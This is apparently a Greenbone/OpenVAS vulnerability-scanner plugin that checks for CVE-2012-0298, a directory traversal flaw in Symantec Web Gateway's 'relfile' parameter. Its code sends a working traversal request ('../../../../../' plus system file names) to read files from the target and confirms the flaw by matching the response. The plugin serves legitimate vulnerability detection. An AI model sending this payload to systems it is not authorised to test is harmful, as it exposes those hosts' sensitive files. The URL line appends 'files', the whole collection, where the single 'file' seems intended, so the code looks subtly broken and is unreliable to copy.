CPE = "cpe:/a:symantec:web_gateway";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103489" );
	script_bugtraq_id( 53442 );
	script_cve_id( "CVE-2012-0298" );
	script_tag( name: "cvss_base", value: "6.4" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:P" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_name( "Symantec Web Gateway 'relfile' Parameter Directory Traversal Vulnerability" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-05-18 10:03:57 +0200 (Fri, 18 May 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "gb_symantec_web_gateway_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "symantec_web_gateway/installed" );
	script_tag( name: "impact", value: "Successful exploitation could allow attackers to read arbitrary files via
  directory traversal attacks and gain sensitive information." );
	script_tag( name: "affected", value: "Symantec Web Gateway versions 5.0.x before 5.0.3" );
	script_tag( name: "insight", value: "The flaw is due to an improper validation of user-supplied input
  passed  via the 'relfile' parameter to the '/spywall/releasenotes.php',
  which allows  attackers to read arbitrary files via a ../(dot dot) sequences." );
	script_tag( name: "solution", value: "Upgrade to Symantec Web Gateway version 5.0.3 or later." );
	script_tag( name: "summary", value: "This host is running Symantec Web Gateway and is prone to directory
  traversal vulnerability." );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/53442" );
	script_xref( name: "URL", value: "http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2012&suid=20120517_00" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/49216" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
files = traversal_files( "linux" );
for pattern in keys( files ) {
	file = files[pattern];
	url = NASLString( dir, "/spywall/releasenotes.php?relfile=../../../../../" + files );
	if(http_vuln_check( port: port, url: url, pattern: pattern )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( data: report, port: port );
		exit( 0 );
	}
}
exit( 99 );

